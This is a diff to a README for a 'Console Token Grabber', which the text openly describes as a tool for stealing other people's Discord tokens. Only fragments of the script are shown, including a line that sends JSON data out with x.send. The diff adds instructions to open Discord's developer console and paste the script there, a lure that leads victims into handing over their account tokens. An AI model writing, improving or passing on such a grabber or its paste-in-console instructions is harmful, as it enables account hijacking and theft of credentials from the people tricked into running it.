@@ -1,4 +1,4 @@
-# Basic Console Token Grabber
+## 🔐 Basic Console Token Grabber
 **It's a simple "Console Token Grabber" that you can use to steal other people's Discord Token.**
 
 <!--<h3 align="center">
@@ -25,3 +25,7 @@
     x.send(JSON.stringify(y));
     w.close()
 }());```
+
+## 🔐 How to use
+
+- Go ond Discord and press CTRL + SHIFT + I and paste the Script in the console.
